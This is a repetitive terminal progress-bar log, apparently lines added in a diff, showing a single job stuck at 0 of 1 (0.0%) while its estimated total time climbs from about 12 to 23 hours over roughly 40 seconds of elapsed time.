+[⣟] 0/1(0.0%)   Time: 43s/12h 6m 58s        
+[⡿] 0/1(0.0%)   Time: 43s/12h 8m 39s        
+[⢿] 0/1(0.0%)   Time: 43s/12h 10m 19s        
+[⣻] 0/1(0.0%)   Time: 43s/12h 11m 59s        
+[⣽] 0/1(0.0%)   Time: 44s/12h 13m 40s        
+[⣾] 0/1(0.0%)   Time: 44s/12h 15m 20s        
+[⣷] 0/1(0.0%)   Time: 44s/12h 17m 0s        
+[⣯] 0/1(0.0%)   Time: 44s/12h 18m 40s        
+[⣟] 0/1(0.0%)   Time: 44s/12h 20m 21s        
+[⡿] 0/1(0.0%)   Time: 44s/12h 22m 1s        
+[⢿] 0/1(0.0%)   Time: 44s/12h 23m 41s        
+[⣻] 0/1(0.0%)   Time: 44s/12h 25m 22s        
+[⣽] 0/1(0.0%)   Time: 44s/12h 27m 2s        
+[⣾] 0/1(0.0%)   Time: 44s/12h 28m 42s        
+[⣷] 0/1(0.0%)   Time: 45s/12h 30m 22s        
+[⣯] 0/1(0.0%)   Time: 45s/12h 32m 3s        
+[⣟] 0/1(0.0%)   Time: 45s/12h 33m 43s        
+[⡿] 0/1(0.0%)   Time: 45s/12h 35m 23s        
+[⢿] 0/1(0.0%)   Time: 45s/12h 37m 3s        
+[⣻] 0/1(0.0%)   Time: 45s/12h 38m 43s        
+[⣽] 0/1(0.0%)   Time: 45s/12h 40m 24s        
+[⣾] 0/1(0.0%)   Time: 45s/12h 42m 4s        
+[⣷] 0/1(0.0%)   Time: 45s/12h 43m 44s        
+[⣯] 0/1(0.0%)   Time: 45s/12h 45m 24s        
+[⣟] 0/1(0.0%)   Time: 46s/12h 47m 5s        
+[⡿] 0/1(0.0%)   Time: 46s/12h 48m 45s        
+[⢿] 0/1(0.0%)   Time: 46s/12h 50m 25s        
+[⣻] 0/1(0.0%)   Time: 46s/12h 52m 5s        
+[⣽] 0/1(0.0%)   Time: 46s/12h 53m 46s        
+[⣾] 0/1(0.0%)   Time: 46s/12h 55m 26s        
+[⣷] 0/1(0.0%)   Time: 46s/12h 57m 6s        
+[⣯] 0/1(0.0%)   Time: 46s/12h 58m 46s        
+[⣟] 0/1(0.0%)   Time: 46s/13h 26s        
+[⡿] 0/1(0.0%)   Time: 46s/13h 2m 7s        
+[⢿] 0/1(0.0%)   Time: 47s/13h 3m 47s        
+[⣻] 0/1(0.0%)   Time: 47s/13h 5m 27s        
+[⣽] 0/1(0.0%)   Time: 47s/13h 7m 7s        
+[⣾] 0/1(0.0%)   Time: 47s/13h 8m 48s        
+[⣷] 0/1(0.0%)   Time: 47s/13h 10m 28s        
+[⣯] 0/1(0.0%)   Time: 47s/13h 12m 8s        
+[⣟] 0/1(0.0%)   Time: 47s/13h 13m 48s        
+[⡿] 0/1(0.0%)   Time: 47s/13h 15m 28s        
+[⢿] 0/1(0.0%)   Time: 47s/13h 17m 9s        
+[⣻] 0/1(0.0%)   Time: 47s/13h 18m 49s        
+[⣽] 0/1(0.0%)   Time: 48s/13h 20m 29s        
+[⣾] 0/1(0.0%)   Time: 48s/13h 22m 10s        
+[⣷] 0/1(0.0%)   Time: 48s/13h 23m 50s        
+[⣯] 0/1(0.0%)   Time: 48s/13h 25m 30s        
+[⣟] 0/1(0.0%)   Time: 48s/13h 27m 10s        
+[⡿] 0/1(0.0%)   Time: 48s/13h 28m 51s        
+[⢿] 0/1(0.0%)   Time: 48s/13h 30m 31s        
+[⣻] 0/1(0.0%)   Time: 48s/13h 32m 11s        
+[⣽] 0/1(0.0%)   Time: 48s/13h 33m 51s        
+[⣾] 0/1(0.0%)   Time: 48s/13h 35m 32s        
+[⣷] 0/1(0.0%)   Time: 49s/13h 37m 12s        
+[⣯] 0/1(0.0%)   Time: 49s/13h 38m 52s        
+[⣟] 0/1(0.0%)   Time: 49s/13h 40m 32s        
+[⡿] 0/1(0.0%)   Time: 49s/13h 42m 13s        
+[⢿] 0/1(0.0%)   Time: 49s/13h 43m 53s        
+[⣻] 0/1(0.0%)   Time: 49s/13h 45m 33s        
+[⣽] 0/1(0.0%)   Time: 49s/13h 47m 14s        
+[⣾] 0/1(0.0%)   Time: 49s/13h 48m 54s        
+[⣷] 0/1(0.0%)   Time: 49s/13h 50m 34s        
+[⣯] 0/1(0.0%)   Time: 49s/13h 52m 14s        
+[⣟] 0/1(0.0%)   Time: 50s/13h 53m 55s        
+[⡿] 0/1(0.0%)   Time: 50s/13h 55m 35s        
+[⢿] 0/1(0.0%)   Time: 50s/13h 57m 15s        
+[⣻] 0/1(0.0%)   Time: 50s/13h 58m 55s        
+[⣽] 0/1(0.0%)   Time: 50s/14h 36s        
+[⣾] 0/1(0.0%)   Time: 50s/14h 2m 16s        
+[⣷] 0/1(0.0%)   Time: 50s/14h 3m 56s        
+[⣯] 0/1(0.0%)   Time: 50s/14h 5m 36s        
+[⣟] 0/1(0.0%)   Time: 50s/14h 7m 17s        
+[⡿] 0/1(0.0%)   Time: 50s/14h 8m 57s        
+[⢿] 0/1(0.0%)   Time: 51s/14h 10m 37s        
+[⣻] 0/1(0.0%)   Time: 51s/14h 12m 17s        
+[⣽] 0/1(0.0%)   Time: 51s/14h 13m 57s        
+[⣾] 0/1(0.0%)   Time: 51s/14h 15m 38s        
+[⣷] 0/1(0.0%)   Time: 51s/14h 17m 18s        
+[⣯] 0/1(0.0%)   Time: 51s/14h 18m 58s        
+[⣟] 0/1(0.0%)   Time: 51s/14h 20m 38s        
+[⡿] 0/1(0.0%)   Time: 51s/14h 22m 19s        
+[⢿] 0/1(0.0%)   Time: 51s/14h 23m 59s        
+[⣻] 0/1(0.0%)   Time: 51s/14h 25m 39s        
+[⣽] 0/1(0.0%)   Time: 52s/14h 27m 19s        
+[⣾] 0/1(0.0%)   Time: 52s/14h 29m 0s        
+[⣷] 0/1(0.0%)   Time: 52s/14h 30m 40s        
+[⣯] 0/1(0.0%)   Time: 52s/14h 32m 20s        
+[⣟] 0/1(0.0%)   Time: 52s/14h 34m 0s        
+[⡿] 0/1(0.0%)   Time: 52s/14h 35m 41s        
+[⢿] 0/1(0.0%)   Time: 52s/14h 37m 21s        
+[⣻] 0/1(0.0%)   Time: 52s/14h 39m 1s        
+[⣽] 0/1(0.0%)   Time: 52s/14h 40m 41s        
+[⣾] 0/1(0.0%)   Time: 52s/14h 42m 21s        
+[⣷] 0/1(0.0%)   Time: 53s/14h 44m 2s        
+[⣯] 0/1(0.0%)   Time: 53s/14h 45m 42s        
+[⣟] 0/1(0.0%)   Time: 53s/14h 47m 22s        
+[⡿] 0/1(0.0%)   Time: 53s/14h 49m 2s        
+[⢿] 0/1(0.0%)   Time: 53s/14h 50m 43s        
+[⣻] 0/1(0.0%)   Time: 53s/14h 52m 23s        
+[⣽] 0/1(0.0%)   Time: 53s/14h 54m 3s        
+[⣾] 0/1(0.0%)   Time: 53s/14h 55m 43s        
+[⣷] 0/1(0.0%)   Time: 53s/14h 57m 24s        
+[⣯] 0/1(0.0%)   Time: 53s/14h 59m 4s        
+[⣟] 0/1(0.0%)   Time: 54s/15h 44s        
+[⡿] 0/1(0.0%)   Time: 54s/15h 2m 24s        
+[⢿] 0/1(0.0%)   Time: 54s/15h 4m 5s        
+[⣻] 0/1(0.0%)   Time: 54s/15h 5m 45s        
+[⣽] 0/1(0.0%)   Time: 54s/15h 7m 25s        
+[⣾] 0/1(0.0%)   Time: 54s/15h 9m 6s        
+[⣷] 0/1(0.0%)   Time: 54s/15h 10m 46s        
+[⣯] 0/1(0.0%)   Time: 54s/15h 12m 26s        
+[⣟] 0/1(0.0%)   Time: 54s/15h 14m 6s        
+[⡿] 0/1(0.0%)   Time: 54s/15h 15m 47s        
+[⢿] 0/1(0.0%)   Time: 55s/15h 17m 27s        
+[⣻] 0/1(0.0%)   Time: 55s/15h 19m 7s        
+[⣽] 0/1(0.0%)   Time: 55s/15h 20m 48s        
+[⣾] 0/1(0.0%)   Time: 55s/15h 22m 28s        
+[⣷] 0/1(0.0%)   Time: 55s/15h 24m 8s        
+[⣯] 0/1(0.0%)   Time: 55s/15h 25m 48s        
+[⣟] 0/1(0.0%)   Time: 55s/15h 27m 29s        
+[⡿] 0/1(0.0%)   Time: 55s/15h 29m 9s        
+[⢿] 0/1(0.0%)   Time: 55s/15h 30m 49s        
+[⣻] 0/1(0.0%)   Time: 55s/15h 32m 29s        
+[⣽] 0/1(0.0%)   Time: 56s/15h 34m 10s        
+[⣾] 0/1(0.0%)   Time: 56s/15h 35m 50s        
+[⣷] 0/1(0.0%)   Time: 56s/15h 37m 30s        
+[⣯] 0/1(0.0%)   Time: 56s/15h 39m 10s        
+[⣟] 0/1(0.0%)   Time: 56s/15h 40m 50s        
+[⡿] 0/1(0.0%)   Time: 56s/15h 42m 31s        
+[⢿] 0/1(0.0%)   Time: 56s/15h 44m 11s        
+[⣻] 0/1(0.0%)   Time: 56s/15h 45m 51s        
+[⣽] 0/1(0.0%)   Time: 56s/15h 47m 31s        
+[⣾] 0/1(0.0%)   Time: 56s/15h 49m 11s        
+[⣷] 0/1(0.0%)   Time: 57s/15h 50m 52s        
+[⣯] 0/1(0.0%)   Time: 57s/15h 52m 32s        
+[⣟] 0/1(0.0%)   Time: 57s/15h 54m 12s        
+[⡿] 0/1(0.0%)   Time: 57s/15h 55m 52s        
+[⢿] 0/1(0.0%)   Time: 57s/15h 57m 33s        
+[⣻] 0/1(0.0%)   Time: 57s/15h 59m 13s        
+[⣽] 0/1(0.0%)   Time: 57s/16h 53s        
+[⣾] 0/1(0.0%)   Time: 57s/16h 2m 33s        
+[⣷] 0/1(0.0%)   Time: 57s/16h 4m 14s        
+[⣯] 0/1(0.0%)   Time: 57s/16h 5m 54s        
+[⣟] 0/1(0.0%)   Time: 58s/16h 7m 34s        
+[⡿] 0/1(0.0%)   Time: 58s/16h 9m 14s        
+[⢿] 0/1(0.0%)   Time: 58s/16h 10m 54s        
+[⣻] 0/1(0.0%)   Time: 58s/16h 12m 35s        
+[⣽] 0/1(0.0%)   Time: 58s/16h 14m 15s        
+[⣾] 0/1(0.0%)   Time: 58s/16h 15m 55s        
+[⣷] 0/1(0.0%)   Time: 58s/16h 17m 35s        
+[⣯] 0/1(0.0%)   Time: 58s/16h 19m 16s        
+[⣟] 0/1(0.0%)   Time: 58s/16h 20m 56s        
+[⡿] 0/1(0.0%)   Time: 58s/16h 22m 36s        
+[⢿] 0/1(0.0%)   Time: 59s/16h 24m 16s        
+[⣻] 0/1(0.0%)   Time: 59s/16h 25m 57s        
+[⣽] 0/1(0.0%)   Time: 59s/16h 27m 37s        
+[⣾] 0/1(0.0%)   Time: 59s/16h 29m 17s        
+[⣷] 0/1(0.0%)   Time: 59s/16h 30m 57s        
+[⣯] 0/1(0.0%)   Time: 59s/16h 32m 37s        
+[⣟] 0/1(0.0%)   Time: 59s/16h 34m 18s        
+[⡿] 0/1(0.0%)   Time: 59s/16h 35m 58s        
+[⢿] 0/1(0.0%)   Time: 59s/16h 37m 38s        
+[⣻] 0/1(0.0%)   Time: 59s/16h 39m 19s        
+[⣽] 0/1(0.0%)   Time: 1m 0s/16h 40m 59s        
+[⣾] 0/1(0.0%)   Time: 1m 0s/16h 42m 39s        
+[⣷] 0/1(0.0%)   Time: 1m 0s/16h 44m 19s        
+[⣯] 0/1(0.0%)   Time: 1m 0s/16h 46m 0s        
+[⣟] 0/1(0.0%)   Time: 1m 0s/16h 47m 40s        
+[⡿] 0/1(0.0%)   Time: 1m 0s/16h 49m 20s        
+[⢿] 0/1(0.0%)   Time: 1m 0s/16h 51m 0s        
+[⣻] 0/1(0.0%)   Time: 1m 0s/16h 52m 41s        
+[⣽] 0/1(0.0%)   Time: 1m 0s/16h 54m 21s        
+[⣾] 0/1(0.0%)   Time: 1m 0s/16h 56m 1s        
+[⣷] 0/1(0.0%)   Time: 1m 1s/16h 57m 41s        
+[⣯] 0/1(0.0%)   Time: 1m 1s/16h 59m 22s        
+[⣟] 0/1(0.0%)   Time: 1m 1s/17h 1m 2s        
+[⡿] 0/1(0.0%)   Time: 1m 1s/17h 2m 42s        
+[⢿] 0/1(0.0%)   Time: 1m 1s/17h 4m 22s        
+[⣻] 0/1(0.0%)   Time: 1m 1s/17h 6m 3s        
+[⣽] 0/1(0.0%)   Time: 1m 1s/17h 7m 43s        
+[⣾] 0/1(0.0%)   Time: 1m 1s/17h 9m 23s        
+[⣷] 0/1(0.0%)   Time: 1m 1s/17h 11m 4s        
+[⣯] 0/1(0.0%)   Time: 1m 1s/17h 12m 44s        
+[⣟] 0/1(0.0%)   Time: 1m 2s/17h 14m 24s        
+[⡿] 0/1(0.0%)   Time: 1m 2s/17h 16m 5s        
+[⢿] 0/1(0.0%)   Time: 1m 2s/17h 17m 45s        
+[⣻] 0/1(0.0%)   Time: 1m 2s/17h 19m 25s        
+[⣽] 0/1(0.0%)   Time: 1m 2s/17h 21m 6s        
+[⣾] 0/1(0.0%)   Time: 1m 2s/17h 22m 46s        
+[⣷] 0/1(0.0%)   Time: 1m 2s/17h 24m 26s        
+[⣯] 0/1(0.0%)   Time: 1m 2s/17h 26m 6s        
+[⣟] 0/1(0.0%)   Time: 1m 2s/17h 27m 46s        
+[⡿] 0/1(0.0%)   Time: 1m 2s/17h 29m 27s        
+[⢿] 0/1(0.0%)   Time: 1m 3s/17h 31m 7s        
+[⣻] 0/1(0.0%)   Time: 1m 3s/17h 32m 47s        
+[⣽] 0/1(0.0%)   Time: 1m 3s/17h 34m 27s        
+[⣾] 0/1(0.0%)   Time: 1m 3s/17h 36m 8s        
+[⣷] 0/1(0.0%)   Time: 1m 3s/17h 37m 48s        
+[⣯] 0/1(0.0%)   Time: 1m 3s/17h 39m 28s        
+[⣟] 0/1(0.0%)   Time: 1m 3s/17h 41m 9s        
+[⡿] 0/1(0.0%)   Time: 1m 3s/17h 42m 49s        
+[⢿] 0/1(0.0%)   Time: 1m 3s/17h 44m 29s        
+[⣻] 0/1(0.0%)   Time: 1m 3s/17h 46m 9s        
+[⣽] 0/1(0.0%)   Time: 1m 4s/17h 47m 50s        
+[⣾] 0/1(0.0%)   Time: 1m 4s/17h 49m 30s        
+[⣷] 0/1(0.0%)   Time: 1m 4s/17h 51m 10s        
+[⣯] 0/1(0.0%)   Time: 1m 4s/17h 52m 50s        
+[⣟] 0/1(0.0%)   Time: 1m 4s/17h 54m 31s        
+[⡿] 0/1(0.0%)   Time: 1m 4s/17h 56m 11s        
+[⢿] 0/1(0.0%)   Time: 1m 4s/17h 57m 51s        
+[⣻] 0/1(0.0%)   Time: 1m 4s/17h 59m 31s        
+[⣽] 0/1(0.0%)   Time: 1m 4s/18h 1m 11s        
+[⣾] 0/1(0.0%)   Time: 1m 4s/18h 2m 52s        
+[⣷] 0/1(0.0%)   Time: 1m 5s/18h 4m 32s        
+[⣯] 0/1(0.0%)   Time: 1m 5s/18h 6m 12s        
+[⣟] 0/1(0.0%)   Time: 1m 5s/18h 7m 52s        
+[⡿] 0/1(0.0%)   Time: 1m 5s/18h 9m 33s        
+[⢿] 0/1(0.0%)   Time: 1m 5s/18h 11m 13s        
+[⣻] 0/1(0.0%)   Time: 1m 5s/18h 12m 53s        
+[⣽] 0/1(0.0%)   Time: 1m 5s/18h 14m 33s        
+[⣾] 0/1(0.0%)   Time: 1m 5s/18h 16m 14s        
+[⣷] 0/1(0.0%)   Time: 1m 5s/18h 17m 54s        
+[⣯] 0/1(0.0%)   Time: 1m 5s/18h 19m 34s        
+[⣟] 0/1(0.0%)   Time: 1m 6s/18h 21m 14s        
+[⡿] 0/1(0.0%)   Time: 1m 6s/18h 22m 55s        
+[⢿] 0/1(0.0%)   Time: 1m 6s/18h 24m 35s        
+[⣻] 0/1(0.0%)   Time: 1m 6s/18h 26m 15s        
+[⣽] 0/1(0.0%)   Time: 1m 6s/18h 27m 55s        
+[⣾] 0/1(0.0%)   Time: 1m 6s/18h 29m 36s        
+[⣷] 0/1(0.0%)   Time: 1m 6s/18h 31m 16s        
+[⣯] 0/1(0.0%)   Time: 1m 6s/18h 32m 56s        
+[⣟] 0/1(0.0%)   Time: 1m 6s/18h 34m 36s        
+[⡿] 0/1(0.0%)   Time: 1m 6s/18h 36m 17s        
+[⢿] 0/1(0.0%)   Time: 1m 7s/18h 37m 57s        
+[⣻] 0/1(0.0%)   Time: 1m 7s/18h 39m 37s        
+[⣽] 0/1(0.0%)   Time: 1m 7s/18h 41m 17s        
+[⣾] 0/1(0.0%)   Time: 1m 7s/18h 42m 58s        
+[⣷] 0/1(0.0%)   Time: 1m 7s/18h 44m 38s        
+[⣯] 0/1(0.0%)   Time: 1m 7s/18h 46m 18s        
+[⣟] 0/1(0.0%)   Time: 1m 7s/18h 47m 58s        
+[⡿] 0/1(0.0%)   Time: 1m 7s/18h 49m 39s        
+[⢿] 0/1(0.0%)   Time: 1m 7s/18h 51m 19s        
+[⣻] 0/1(0.0%)   Time: 1m 7s/18h 52m 59s        
+[⣽] 0/1(0.0%)   Time: 1m 8s/18h 54m 39s        
+[⣾] 0/1(0.0%)   Time: 1m 8s/18h 56m 20s        
+[⣷] 0/1(0.0%)   Time: 1m 8s/18h 58m 0s        
+[⣯] 0/1(0.0%)   Time: 1m 8s/18h 59m 40s        
+[⣟] 0/1(0.0%)   Time: 1m 8s/19h 1m 20s        
+[⡿] 0/1(0.0%)   Time: 1m 8s/19h 3m 1s        
+[⢿] 0/1(0.0%)   Time: 1m 8s/19h 4m 41s        
+[⣻] 0/1(0.0%)   Time: 1m 8s/19h 6m 21s        
+[⣽] 0/1(0.0%)   Time: 1m 8s/19h 8m 1s        
+[⣾] 0/1(0.0%)   Time: 1m 8s/19h 9m 42s        
+[⣷] 0/1(0.0%)   Time: 1m 9s/19h 11m 22s        
+[⣯] 0/1(0.0%)   Time: 1m 9s/19h 13m 2s        
+[⣟] 0/1(0.0%)   Time: 1m 9s/19h 14m 42s        
+[⡿] 0/1(0.0%)   Time: 1m 9s/19h 16m 23s        
+[⢿] 0/1(0.0%)   Time: 1m 9s/19h 18m 3s        
+[⣻] 0/1(0.0%)   Time: 1m 9s/19h 19m 43s        
+[⣽] 0/1(0.0%)   Time: 1m 9s/19h 21m 23s        
+[⣾] 0/1(0.0%)   Time: 1m 9s/19h 23m 4s        
+[⣷] 0/1(0.0%)   Time: 1m 9s/19h 24m 44s        
+[⣯] 0/1(0.0%)   Time: 1m 9s/19h 26m 24s        
+[⣟] 0/1(0.0%)   Time: 1m 10s/19h 28m 4s        
+[⡿] 0/1(0.0%)   Time: 1m 10s/19h 29m 44s        
+[⢿] 0/1(0.0%)   Time: 1m 10s/19h 31m 25s        
+[⣻] 0/1(0.0%)   Time: 1m 10s/19h 33m 5s        
+[⣽] 0/1(0.0%)   Time: 1m 10s/19h 34m 45s        
+[⣾] 0/1(0.0%)   Time: 1m 10s/19h 36m 25s        
+[⣷] 0/1(0.0%)   Time: 1m 10s/19h 38m 6s        
+[⣯] 0/1(0.0%)   Time: 1m 10s/19h 39m 46s        
+[⣟] 0/1(0.0%)   Time: 1m 10s/19h 41m 26s        
+[⡿] 0/1(0.0%)   Time: 1m 10s/19h 43m 7s        
+[⢿] 0/1(0.0%)   Time: 1m 11s/19h 44m 47s        
+[⣻] 0/1(0.0%)   Time: 1m 11s/19h 46m 27s        
+[⣽] 0/1(0.0%)   Time: 1m 11s/19h 48m 7s        
+[⣾] 0/1(0.0%)   Time: 1m 11s/19h 49m 48s        
+[⣷] 0/1(0.0%)   Time: 1m 11s/19h 51m 28s        
+[⣯] 0/1(0.0%)   Time: 1m 11s/19h 53m 8s        
+[⣟] 0/1(0.0%)   Time: 1m 11s/19h 54m 48s        
+[⡿] 0/1(0.0%)   Time: 1m 11s/19h 56m 29s        
+[⢿] 0/1(0.0%)   Time: 1m 11s/19h 58m 9s        
+[⣻] 0/1(0.0%)   Time: 1m 11s/19h 59m 49s        
+[⣽] 0/1(0.0%)   Time: 1m 12s/20h 1m 29s        
+[⣾] 0/1(0.0%)   Time: 1m 12s/20h 3m 10s        
+[⣷] 0/1(0.0%)   Time: 1m 12s/20h 4m 50s        
+[⣯] 0/1(0.0%)   Time: 1m 12s/20h 6m 30s        
+[⣟] 0/1(0.0%)   Time: 1m 12s/20h 8m 10s        
+[⡿] 0/1(0.0%)   Time: 1m 12s/20h 9m 51s        
+[⢿] 0/1(0.0%)   Time: 1m 12s/20h 11m 31s        
+[⣻] 0/1(0.0%)   Time: 1m 12s/20h 13m 11s        
+[⣽] 0/1(0.0%)   Time: 1m 12s/20h 14m 51s        
+[⣾] 0/1(0.0%)   Time: 1m 12s/20h 16m 32s        
+[⣷] 0/1(0.0%)   Time: 1m 13s/20h 18m 12s        
+[⣯] 0/1(0.0%)   Time: 1m 13s/20h 19m 52s        
+[⣟] 0/1(0.0%)   Time: 1m 13s/20h 21m 32s        
+[⡿] 0/1(0.0%)   Time: 1m 13s/20h 23m 13s        
+[⢿] 0/1(0.0%)   Time: 1m 13s/20h 24m 53s        
+[⣻] 0/1(0.0%)   Time: 1m 13s/20h 26m 33s        
+[⣽] 0/1(0.0%)   Time: 1m 13s/20h 28m 13s        
+[⣾] 0/1(0.0%)   Time: 1m 13s/20h 29m 54s        
+[⣷] 0/1(0.0%)   Time: 1m 13s/20h 31m 34s        
+[⣯] 0/1(0.0%)   Time: 1m 13s/20h 33m 14s        
+[⣟] 0/1(0.0%)   Time: 1m 14s/20h 34m 54s        
+[⡿] 0/1(0.0%)   Time: 1m 14s/20h 36m 35s        
+[⢿] 0/1(0.0%)   Time: 1m 14s/20h 38m 15s        
+[⣻] 0/1(0.0%)   Time: 1m 14s/20h 39m 55s        
+[⣽] 0/1(0.0%)   Time: 1m 14s/20h 41m 35s        
+[⣾] 0/1(0.0%)   Time: 1m 14s/20h 43m 16s        
+[⣷] 0/1(0.0%)   Time: 1m 14s/20h 44m 56s        
+[⣯] 0/1(0.0%)   Time: 1m 14s/20h 46m 36s        
+[⣟] 0/1(0.0%)   Time: 1m 14s/20h 48m 16s        
+[⡿] 0/1(0.0%)   Time: 1m 14s/20h 49m 57s        
+[⢿] 0/1(0.0%)   Time: 1m 15s/20h 51m 37s        
+[⣻] 0/1(0.0%)   Time: 1m 15s/20h 53m 17s        
+[⣽] 0/1(0.0%)   Time: 1m 15s/20h 54m 57s        
+[⣾] 0/1(0.0%)   Time: 1m 15s/20h 56m 38s        
+[⣷] 0/1(0.0%)   Time: 1m 15s/20h 58m 18s        
+[⣯] 0/1(0.0%)   Time: 1m 15s/20h 59m 58s        
+[⣟] 0/1(0.0%)   Time: 1m 15s/21h 1m 38s        
+[⡿] 0/1(0.0%)   Time: 1m 15s/21h 3m 18s        
+[⢿] 0/1(0.0%)   Time: 1m 15s/21h 4m 59s        
+[⣻] 0/1(0.0%)   Time: 1m 15s/21h 6m 39s        
+[⣽] 0/1(0.0%)   Time: 1m 16s/21h 8m 19s        
+[⣾] 0/1(0.0%)   Time: 1m 16s/21h 9m 59s        
+[⣷] 0/1(0.0%)   Time: 1m 16s/21h 11m 40s        
+[⣯] 0/1(0.0%)   Time: 1m 16s/21h 13m 20s        
+[⣟] 0/1(0.0%)   Time: 1m 16s/21h 15m 0s        
+[⡿] 0/1(0.0%)   Time: 1m 16s/21h 16m 40s        
+[⢿] 0/1(0.0%)   Time: 1m 16s/21h 18m 21s        
+[⣻] 0/1(0.0%)   Time: 1m 16s/21h 20m 1s        
+[⣽] 0/1(0.0%)   Time: 1m 16s/21h 21m 41s        
+[⣾] 0/1(0.0%)   Time: 1m 17s/21h 23m 21s        
+[⣷] 0/1(0.0%)   Time: 1m 17s/21h 25m 2s        
+[⣯] 0/1(0.0%)   Time: 1m 17s/21h 26m 42s        
+[⣟] 0/1(0.0%)   Time: 1m 17s/21h 28m 22s        
+[⡿] 0/1(0.0%)   Time: 1m 17s/21h 30m 2s        
+[⢿] 0/1(0.0%)   Time: 1m 17s/21h 31m 43s        
+[⣻] 0/1(0.0%)   Time: 1m 17s/21h 33m 23s        
+[⣽] 0/1(0.0%)   Time: 1m 17s/21h 35m 3s        
+[⣾] 0/1(0.0%)   Time: 1m 17s/21h 36m 44s        
+[⣷] 0/1(0.0%)   Time: 1m 17s/21h 38m 24s        
+[⣯] 0/1(0.0%)   Time: 1m 18s/21h 40m 4s        
+[⣟] 0/1(0.0%)   Time: 1m 18s/21h 41m 44s        
+[⡿] 0/1(0.0%)   Time: 1m 18s/21h 43m 25s        
+[⢿] 0/1(0.0%)   Time: 1m 18s/21h 45m 5s        
+[⣻] 0/1(0.0%)   Time: 1m 18s/21h 46m 45s        
+[⣽] 0/1(0.0%)   Time: 1m 18s/21h 48m 25s        
+[⣾] 0/1(0.0%)   Time: 1m 18s/21h 50m 6s        
+[⣷] 0/1(0.0%)   Time: 1m 18s/21h 51m 46s        
+[⣯] 0/1(0.0%)   Time: 1m 18s/21h 53m 26s        
+[⣟] 0/1(0.0%)   Time: 1m 18s/21h 55m 6s        
+[⡿] 0/1(0.0%)   Time: 1m 19s/21h 56m 46s        
+[⢿] 0/1(0.0%)   Time: 1m 19s/21h 58m 27s        
+[⣻] 0/1(0.0%)   Time: 1m 19s/22h 7s        
+[⣽] 0/1(0.0%)   Time: 1m 19s/22h 1m 47s        
+[⣾] 0/1(0.0%)   Time: 1m 19s/22h 3m 27s        
+[⣷] 0/1(0.0%)   Time: 1m 19s/22h 5m 7s        
+[⣯] 0/1(0.0%)   Time: 1m 19s/22h 6m 48s        
+[⣟] 0/1(0.0%)   Time: 1m 19s/22h 8m 28s        
+[⡿] 0/1(0.0%)   Time: 1m 19s/22h 10m 8s        
+[⢿] 0/1(0.0%)   Time: 1m 19s/22h 11m 48s        
+[⣻] 0/1(0.0%)   Time: 1m 20s/22h 13m 29s        
+[⣽] 0/1(0.0%)   Time: 1m 20s/22h 15m 9s        
+[⣾] 0/1(0.0%)   Time: 1m 20s/22h 16m 49s        
+[⣷] 0/1(0.0%)   Time: 1m 20s/22h 18m 29s        
+[⣯] 0/1(0.0%)   Time: 1m 20s/22h 20m 10s        
+[⣟] 0/1(0.0%)   Time: 1m 20s/22h 21m 50s        
+[⡿] 0/1(0.0%)   Time: 1m 20s/22h 23m 30s        
+[⢿] 0/1(0.0%)   Time: 1m 20s/22h 25m 11s        
+[⣻] 0/1(0.0%)   Time: 1m 20s/22h 26m 51s        
+[⣽] 0/1(0.0%)   Time: 1m 20s/22h 28m 31s        
+[⣾] 0/1(0.0%)   Time: 1m 21s/22h 30m 11s        
+[⣷] 0/1(0.0%)   Time: 1m 21s/22h 31m 52s        
+[⣯] 0/1(0.0%)   Time: 1m 21s/22h 33m 32s        
+[⣟] 0/1(0.0%)   Time: 1m 21s/22h 35m 12s        
+[⡿] 0/1(0.0%)   Time: 1m 21s/22h 36m 52s        
+[⢿] 0/1(0.0%)   Time: 1m 21s/22h 38m 33s        
+[⣻] 0/1(0.0%)   Time: 1m 21s/22h 40m 13s        
+[⣽] 0/1(0.0%)   Time: 1m 21s/22h 41m 53s        
+[⣾] 0/1(0.0%)   Time: 1m 21s/22h 43m 33s        
+[⣷] 0/1(0.0%)   Time: 1m 21s/22h 45m 14s        
+[⣯] 0/1(0.0%)   Time: 1m 22s/22h 46m 54s        
+[⣟] 0/1(0.0%)   Time: 1m 22s/22h 48m 34s        
+[⡿] 0/1(0.0%)   Time: 1m 22s/22h 50m 14s        
+[⢿] 0/1(0.0%)   Time: 1m 22s/22h 51m 55s        
+[⣻] 0/1(0.0%)   Time: 1m 22s/22h 53m 35s        
+[⣽] 0/1(0.0%)   Time: 1m 22s/22h 55m 15s        
+[⣾] 0/1(0.0%)   Time: 1m 22s/22h 56m 55s        
+[⣷] 0/1(0.0%)   Time: 1m 22s/22h 58m 36s        
+[⣯] 0/1(0.0%)   Time: 1m 22s/23h 16s        
+[⣟] 0/1(0.0%)   Time: 1m 22s/23h 1m 56s        
+[⡿] 0/1(0.0%)   Time: 1m 23s/23h 3m 36s        
+[⢿] 0/1(0.0%)   Time: 1m 23s/23h 5m 17s        
+[⣻] 0/1(0.0%)   Time: 1m 23s/23h 6m 57s        
+[⣽] 0/1(0.0%)   Time: 1m 23s/23h 8m 37s        
+[⣾] 0/1(0.0%)   Time: 1m 23s/23h 10m 17s        
+[⣷] 0/1(0.0%)   Time: 1m 23s/23h 11m 57s        
+[⣯] 0/1(0.0%)   Time: 1m 23s/23h 13m 38s        
+[⣟] 0/1(0.0%)   Time: 1m 23s/23h 15m 18s        
+[⡿] 0/1(0.0%)   Time: 1m 23s/23h 16m 58s        
+[⢿] 0/1(0.0%)   Time: 1m 23s/23h 18m 38s        
+[⣻] 0/1(0.0%)   Time: 1m 24s/23h 20m 19s        
+[⣽] 0/1(0.0%)   Time: 1m 24s/23h 21m 59s        
+[⣾] 0/1(0.0%)   Time: 1m 24s/23h 23m 39s        
+[⣷] 0/1(0.0%)   Time: 1m 24s/23h 25m 19s        
+[⣯] 0/1(0.0%)   Time: 1m 24s/23h 27m 0s        
+[⣟] 0/1(0.0%)   Time: 1m 24s/23h 28m 40s        
+[⡿] 0/1(0.0%)   Time: 1m 24s/23h 30m 20s        
+[⢿] 0/1(0.0%)   Time: 1m 24s/23h 32m 1s        
+[⣻] 0/1(0.0%)   Time: 1m 24s/23h 33m 41s        
+[⣽] 0/1(0.0%)   Time: 1m 24s/23h 35m 21s        
+[⣾] 0/1(0.0%)   Time: 1m 25s/23h 37m 1s        
+[⣷] 0/1(0.0%)   Time: 1m 25s/23h 38m 42s        
+[⣯] 0/1(0.0%)   Time: 1m 25s/23h 40m 22s        
+[⣟] 0/1(0.0%)   Time: 1m 25s/23h 42m 2s        
+[⡿] 0/1(0.0%)   Time: 1m 25s/23h 43m 42s        
+[⢿] 0/1(0.0%)   Time: 1m 25s/23h 45m 23s        
